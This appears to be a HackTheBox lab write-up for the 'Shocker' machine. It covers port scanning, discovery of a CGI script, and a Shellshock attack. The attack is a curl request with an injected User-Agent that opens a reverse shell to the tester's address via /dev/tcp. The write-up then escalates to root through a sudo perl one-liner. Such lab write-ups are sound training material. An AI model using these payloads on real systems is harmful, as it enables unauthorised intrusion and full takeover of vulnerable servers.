---
description: Shocker box from HackTheBox write up.
---

# Shocker

## Nmap scan

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -p- --min-rate 1000 10.10.10.56
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-13 13:14 EST
Nmap scan report for 10.10.10.56
Host is up (0.064s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
80/tcp   open  http
2222/tcp open  EtherNetIP-1

Nmap done: 1 IP address (1 host up) scanned in 20.69 seconds
```

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV -p80,2222 10.10.10.56
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-13 13:17 EST
Nmap scan report for 10.10.10.56
Host is up (0.057s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.96 seconds
```

Looks like only two ports are open. Since one of them is SSH let's start looking around the website.

## Port 80

The page only shows a simple index page so we can go for a Gobuster scan. After a while the scan revealed that the `cgi-bin` directory exists on the server so the next step would be to check for scripts inside this directory.

A `gobuster` scan looking for common extensions of files in this directory revealed that `user.sh` exists. Maybe the server is vulnerable to Shellshock so let's spin up a listener and execute:

```bash
curl -H 'User-Agent: () { :;}; /bin/bash -i >& /dev/tcp/10.10.14.20/8000 0>&1' http://10.10.10.56/cgi-bin/user.sh
```

And we have prize!:

```bash
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 8000
listening on [any] 8000 ...
connect to [10.10.14.20] from (UNKNOWN) [10.10.10.56] 47224
bash: no job control in this shell
shelly@Shocker:/usr/lib/cgi-bin$
```

Now we can just stabilize the shell and start to enumerate the host.

## In the box as shelly

The web server is running as the `shelly` user so we can just grab the user flag under: `/home/shelly/user.txt`. Now performing some basic enumeration tasks we can see this:

```bash
shelly@Shocker:/$ sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```

Since we can execute `perl` with `sudo` we should be able to escalate.

### Getting root

We can just execute `bash` from `perl` to get a `root` shell:

```bash
shelly@Shocker:/$ sudo perl -e 'exec "/bin/bash";'
root@Shocker:/#
```

And we can just get the root flag under: `/root/root.txt`.
